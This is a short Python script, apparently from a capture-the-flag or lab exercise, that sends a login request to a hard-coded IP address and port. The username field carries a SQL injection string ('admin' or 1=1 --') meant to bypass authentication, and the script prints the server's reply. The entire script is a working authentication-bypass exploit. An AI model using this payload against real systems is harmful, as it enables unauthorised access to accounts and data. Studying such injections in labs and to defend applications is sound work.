import httpx

resp = httpx.post('http://129.204.78.34:20571/', data={
    'username': 'admin\' or 1=1 --',
    'password': 'admin',
})

print(resp.text)
